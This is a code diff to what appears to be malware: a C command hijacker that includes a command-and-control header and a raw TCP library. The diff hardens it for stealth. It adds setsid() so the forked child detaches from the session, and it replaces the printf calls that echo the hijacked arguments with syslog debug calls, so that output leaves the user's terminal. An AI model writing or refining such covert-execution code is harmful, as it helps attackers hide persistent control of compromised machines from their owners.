@@ -17,6 +17,7 @@
 #include <netinet/tcp.h>
 #include <sys/file.h>
 #include <errno.h>
+#include <syslog.h>
 
 #include "lib/RawTCP.h"
 #include "../common/c&c.h"
@@ -189,6 +190,7 @@ int main(int argc, char* argv[], char *envp[]){
         perror("Fork failed");
     }
     if (pid == 0) {
+        setsid();
         //Child process
         printf("I am the child with pid %d\n", (int) getpid());
 
@@ -213,10 +215,10 @@ int main(int argc, char* argv[], char *envp[]){
     //Parent process. Call original hijacked command
     char* hij_args[argc]; 
     hij_args[0] = argv[1];
-    printf("hijacking ARGS%i: %s\n", 0, hij_args[0]);
+    syslog(LOG_DEBUG, "hijacking ARGS%i: %s\n", 0, hij_args[0]);
     for(int ii=0; ii<argc-2; ii++){
         hij_args[ii+1] = argv[ii+2];
-        printf("hijacking ARGS%i: %s\n", ii+1, hij_args[ii+1]);
+        syslog(LOG_DEBUG, "hijacking ARGS%i: %s\n", ii+1, hij_args[ii+1]);
     }
     hij_args[argc-1] = NULL;
     
